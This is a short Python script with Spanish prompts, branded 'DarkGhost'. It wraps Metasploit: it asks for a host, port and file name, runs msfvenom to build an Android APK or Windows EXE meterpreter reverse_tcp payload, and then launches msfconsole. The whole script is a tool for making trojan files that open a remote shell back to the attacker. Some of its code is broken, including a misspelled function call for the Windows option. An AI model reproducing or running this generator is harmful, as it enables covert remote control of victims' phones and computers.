#!/usr/bin/python
#-*- coding:utf8-*-

import os,sys,time
from colorama import init,Fore
import socket

init()

def entrada1():
	os.system("clear")
	print (Fore.YELLOW+"Tu direccion ip es: ")
	direccion()
	host = raw_input("Direccion IP/host: ")
	port = raw_input("Puerto alojado(8080): ")
	nombre = raw_input("Nombre del archivo: ")

	print (Fore.YELLOW+"Usaremos los siguientes párametros [msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk] ")%(host,port,nombre)
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk"%(host,port,nombre))

	os.system("msfconsole")

def direccion():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	print(s.getsockname()[0])



def entrada2():
	os.system("clear")
	print (Fore.YELLOW+"Tu direccion ip es: ")
	direccion()
	host = raw_input("Direccion IP/host: ")
	port = raw_input("Puerto alojado(8080): ")
	nombre = raw_input("Nombre del archivo: ")

	print (Fore.YELLOW+"Usaremos los siguientes párametros [msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.exe] ")%(host,port,nombre)
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.exe"%(host,port,nombre))

	os.system("msfconsole")	



time.sleep(1.2)
os.system("clear")
print(Fore.RED+"                _                  _       _ _   ")
print("               | |                | |     (_) |  ")
print(" _ __ ___   ___| |_ __ _ ___ _ __ | | ___  _| |_ ")
print("| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __|")
print("| | | | | |  __/ || (_| \__ \ |_) | | (_) | | |_ ")
print("|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__|")
print("                            | |                  ")
print("                            |_|                  "+Fore.WHITE)
time.sleep(0.2)

print ("1- Android")
print ("2- Pc "+Fore.GREEN)

ent = raw_input("DarkGhost-$ ")

if ent == "1":

	
	entrada1()

if ent == "2":
	
	entada2()

if ent == "3":
	os.system("new_bash")